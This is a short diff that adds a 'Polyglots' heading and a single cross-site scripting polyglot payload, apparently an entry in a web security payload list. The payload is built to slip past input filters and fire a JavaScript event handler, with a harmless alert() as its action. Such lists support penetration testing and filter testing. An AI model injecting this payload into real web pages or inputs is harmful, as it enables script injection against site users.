@@ -1,0 +1,5 @@
+# Polyglots
+
+```
+jaVasCript:/*-/*`/*'/*"/**/(/* */oNcliCk=alert() )//
+```
